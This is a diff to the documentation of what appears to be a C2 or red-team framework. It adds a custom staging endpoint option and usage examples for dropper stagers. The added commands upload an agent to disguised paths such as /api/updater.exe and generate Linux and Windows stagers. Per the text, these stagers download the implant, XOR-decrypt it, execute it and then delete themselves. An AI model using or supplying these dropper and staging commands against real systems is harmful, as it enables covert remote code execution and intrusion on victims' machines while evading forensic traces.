@@ -201,8 +201,8 @@ payload phantom_hawk_agent web_app_default --use-failover
 ## Droppers
 
 ### Description
-**IMPORTANT: These are DROPPERS only** - they download an agent from the default payload staging API `/api/assets/main.js`, XOR decrypts, execute the implant, and then delete themselves. They do NOT contain interactive capabilities or command execution features. These are designed purely for initial access and agent deployment. 
-For seamless operation, use the `payload_upload` feature to stage payloads first, the stager will do the rest. 
+**IMPORTANT: These are DROPPERS only** - they download an agent from the default static payload staging API `/api/assets/main.js` unless the operator explicitly define their custom staging endpoint using `download_uri=`, Stagers XOR decrypts, execute the implant, and then delete themselves. They do NOT contain interactive capabilities or command execution features. These are designed purely for initial access and agent deployment. 
+For seamless operation, use the `payload_upload` feature to stage payloads first with a custom endpoint, the stager will do the rest. 
 
 ### Supported Types
 
@@ -217,6 +217,16 @@ For seamless operation, use the `payload_upload` feature to stage payloads first
 stager generate linux_binary host=<c2_host> port=<c2_port> [protocol=https] [download_uri=/api/assets/main.js]
 ```
 
+### Usage Examples
+```
+# Upload Agent to a non-default custom staging endpoint
+payload_upload upload logs/payload_web_app_default_phantom_hawk_agent_20251224_175614.py uri=/api/ag.py
+
+# Stager downloads Agent from https://127.0.0.1:7443/api/ag.py
+stager generate linux_binary host=127.0.0.1 port=7443 protocol=https download_uri=/api/ag.py
+```
+
+
 #### Powershell Dropper
 - **Windows compatibility**
 - **Downloads agent** from `/api/assets/main.js` endpoint and XOR derypts using embedded secret key
@@ -226,6 +236,15 @@ stager generate linux_binary host=<c2_host> port=<c2_port> [protocol=https] [dow
 ### Usage
 ```
 stager generate windows_exe host=<c2_host> port=<c2_port> [protocol=https] [download_uri=/api/assets/main.js]
+```
+
+### Usage Examples
+```
+# Upload Agent to a non-default custom staging endpoint
+payload_upload upload logs/go_agent_20251224_175614.py uri=/api/updater.exe
+
+# Stager downloads Agent from https://127.0.0.1:7443/api/updater.exe
+stager generate windows_exe host=127.0.0.1 port=7443 protocol=https download_uri=/api/updater.exe
 ```
 
 ---
